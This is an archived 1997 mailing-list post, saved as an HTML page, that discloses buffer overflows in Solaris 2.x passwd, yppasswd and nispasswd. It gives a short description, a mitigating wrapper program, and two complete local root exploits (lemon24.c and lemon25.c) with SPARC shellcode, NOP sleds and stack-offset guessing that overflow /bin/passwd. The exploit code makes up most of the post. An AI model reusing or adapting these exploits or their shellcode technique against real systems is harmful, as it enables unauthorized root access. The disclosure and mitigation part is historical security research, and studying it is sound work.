@@ -1,0 +1,279 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: Big Security Hole in Solaris 2.X (X)passwd + exploit -->
+<!--X-From-R13: Qevfgvna EQVWBAD <fxvcbNfhaql.pf.cho.eb> -->
+<!--X-Date: Tue, 25 Feb 1997 07:22:26 &#45;0800 (PST) -->
+<!--X-Message-Id: Pine.GSO.3.95.970225171251.885C&#45;100000@sundy.cs.pub.ro -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>Big Security Hole in Solaris 2.X (X)passwd + exploit</TITLE>
+<LINK REV="made" HREF="mailto:skipo@sundy.cs.pub.ro">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg02647.html">Date Prev</A>][<A HREF="msg02648.html">Date Next</A>][<A HREF="msg02710.html">Thread Prev</A>][<A HREF="msg02650.html">Thread Next</A>][<A HREF="index.html#02707">Date Index</A>][<A HREF="threads.html#02707">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>Big Security Hole in Solaris 2.X (X)passwd + exploit</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: Big Security Hole in Solaris 2.X (X)passwd + exploit</LI>
+<LI><em>From</em>: Cristian SCHIPOR &lt;<A HREF="mailto:skipo@sundy.cs.pub.ro">skipo@sundy.cs.pub.ro</A>&gt;</LI>
+<LI><em>Date</em>: Tue, 25 Feb 1997 17:13:41 +0200 (EET)</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+Tue Feb 25 14:22 EET 1997 Romania
+
+ " Another letter - another bug "
+
+An Exploit for a Big Big security hole in passwd ( + yppasswd and nispasswd)
+
+Under Solaris 2.X passwd, yppasswd and nispasswd can be overflowed in 
+an internal function ( some like sa_chauthtok() ). Using a buffer 
+overflow exploit anyone can gain root access (passwd need suid exec bit 
+from root). passwd has a second  overflow bug  when it is called with 
+'-s' option in an internal strcpy().
+
+I written two exploits one for Solaris 2.4 and one for Solaris 2.5 for 
+sa_chauthtok() type function ( passwd LEMON_BUFFER ). It's a little trick 
+here - the LEMON_BUFFER is shifted in memory with 1 char after exec so it 
+must to shift the LEMON_BUFFER in a reverse direction before exec - 
+that's happening only for a special combination of the exec args - 
+see my exploits.
+
+A way to prevent the exploit is to rename passwd, nispasswd and yppasswd 
+and get out suid-exec bit. After that you have to compile a little 
+program ( some like newpass.c ) with name passwd or nispasswd or yppasswd  
+like root and  give them suid-exec bit. You have to change the  "hidden_passwd" 
+constant with the new name of Xpasswd files.
+
+Cristian Schipor - Computer Science Faculty - Bucharest - Romania
+
+E-mail: skipo@math.pub.ro , skipo@sundy.cs.pub.ro , skipo@ns.ima.ro
+Phone: (401) - 410.60.88
+
+---------------------------- file newpass.c -------------------------------
+#include &lt;stdio.h&gt;
+#include &lt;syslog.h&gt;
+
+#define hidden_passwd "/bin/hpasswd" /*change here ...*/
+#define MAX_LENGTH 32
+
+void main(int argc, char *argv[])
+{
+int i;
+char *args[10];
+	
+	if(argc &lt; 10)
+	{
+		args[0]=hidden_passwd;
+		for(i = 1; i&lt;argc; i++)
+		{
+			if(strlen(argv[i]) &gt; MAX_LENGTH)
+			{
+				printf("You reached the maximum length in args\n");
+				exit(0);
+			}
+			else args[i]=argv[i];
+		}
+		args[i]=(char *)0;
+		execv(args[0],args);
+	}
+	else
+	{
+		printf("You reached the maximum number of args !\n");
+	}
+}
+ 
+---------------------------- end newpass.c  -----------------------------------
+
+------------------------------ EXPLOITS ----------------------------------
+
+------------------------------ lemon24.c --------------------------------
+/*
+Exploit for Solaris 2.4 ( it is a little and subtile different  beetwen this 
+exploit and the prog for Solaris 2.5 - the overflow buffer is shifted 
+with 1 char ) 
+With argv[1] you can modify the stack_offset (+-256).
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+#define BUF_LENGTH      600
+#define EXTRA           600
+#define STACK_OFFSET    1400
+#define SPARC_NOP       0xa61cc013
+
+u_char sparc_shellcode[] =
+"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
+"\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
+"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+"\x91\xd0\x20\x08"
+;
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA + 8];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode),dso=0;
+
+  if(argc &gt; 1) dso=atoi(argv[1]);
+
+  long_p =(u_long *)  buf ;
+    targ_addr = get_sp() - STACK_OFFSET - dso;
+
+  for (i = 0; i &lt; (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+    *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i &lt; code_length; i++)
+    *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+
+
+  for (i = 0; i &lt; EXTRA / sizeof(u_long); i++)
+    *long_p++ =targ_addr;
+
+  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+  targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+  execl("/bin/passwd", "passwd", &amp; buf[1],(char *) 0);
+  perror("execl failed");
+}
+
+-------------------------------- end of lemon24.c  ----------------------------
+
+---------------------------------- lemon25.c  --------------------------------
+
+/*
+This is for Solaris 2.5.(1) !
+With argv[1] you can modify the stack offset (+-500) if you have troubles
+...
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+#define BUF_LENGTH      1100
+#define EXTRA           1200
+#define STACK_OFFSET    3800
+#define SPARC_NOP       0xa61cc013
+
+u_char sparc_shellcode[] =
+"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
+"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
+"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
+"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd4\xff\xff"
+;
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode),dso=0;
+
+  if(argc &gt; 1) dso=atoi(argv[1]);
+
+  long_p =(u_long *)  buf;
+    targ_addr = get_sp() - STACK_OFFSET - dso;
+
+  for (i = 0; i &lt; (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+    *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i &lt; code_length; i++)
+    *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+
+
+  for (i = 0; i &lt; EXTRA / sizeof(u_long); i++)
+    *long_p++ =targ_addr;
+
+  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+  targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+  execl("/bin/passwd", "passwd", buf,(char *) 0);
+  perror("execl failed");
+}
+
+----------------------------------- end of lemon25.c  -------------------------
+
+
+ # End  
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg02647.html">Re: Clipper article in  Cu Digest, #9.10, Wed 20 Feb 97</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg02648.html">Re: Distributed cracks, law, and cryptoanarchy</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg02710.html">SecureFile.</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg02650.html">take me off this list</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#02707"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#02707"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
